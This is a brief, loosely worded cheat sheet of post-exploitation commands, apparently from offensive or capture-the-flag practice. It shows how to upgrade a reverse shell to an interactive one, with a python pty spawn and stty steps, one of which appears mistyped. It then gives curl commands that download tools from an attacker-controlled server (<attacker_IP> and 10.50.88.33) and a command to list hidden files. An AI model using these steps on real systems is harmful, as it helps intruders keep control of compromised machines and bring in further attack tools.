
Got a reverse shell with full access to have to write some code dumb shell to full aceess shell

```
python3 -c "__import__('pty').spawn('/bin/bash')"
stty -raw echo;fg
reset.

export TERM=xterm

```


Make a list of commands to download payloads from the server 

```
curl <attacker_IP>/<tool_name> -o <out_name>
```

```
curl 10.50.88.33/nmap -o nmap_sar
```


To see hidden files 
```
cd / && ls -lah
```

